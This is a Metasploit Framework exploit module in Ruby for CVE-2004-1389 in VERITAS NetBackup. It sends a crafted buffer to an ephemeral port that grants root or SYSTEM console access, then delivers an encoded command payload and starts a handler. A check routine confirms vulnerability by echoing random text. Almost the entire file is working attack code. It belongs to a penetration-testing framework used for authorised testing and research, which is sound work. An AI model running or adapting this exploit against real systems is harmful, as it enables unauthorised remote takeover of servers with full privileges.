##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'VERITAS NetBackup Remote Command Execution',
			'Description'    => %q{
				This module allows arbitrary command execution on an
				ephemeral port opened by Veritas NetBackup, whilst an
				administrator is authenticated. The port is opened and
				allows direct console access as root or SYSTEM from
				any source address.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2004-1389' ],
					[ 'OSVDB', '11026' ],
					[ 'BID', '11494' ],
					[ 'URL', 'http://seer.support.veritas.com/docs/271727.htm' ],

				],
			'Privileged'     => true,
			'Platform'       => ['unix', 'win', 'linux'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        => 
				[
					['Automatic', { }],
				],
			'DisclosureDate' => 'Oct 21 2004',
			'DefaultTarget' => 0))
	end

	def check
		connect

		sploit = rand_text_alphanumeric(10)
		buf = "\x20\x20\x201\x20\x20\x20\x20\x20\x201\necho #{sploit}\n"

		sock.put(buf)
		banner = sock.get(3,3)

		disconnect

		if (banner and banner =~ /#{sploit}/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		sploit = payload.encoded.split(" ")

		buf = "\x20\x20\x201\x20\x20\x20\x20\x20\x201\n"
		buf << payload.encoded
		buf << "\n"

		sock.put(buf)
		res = sock.get(-1,3)
		
		print_status("#{res}")

		handler
		disconnect
	end

end
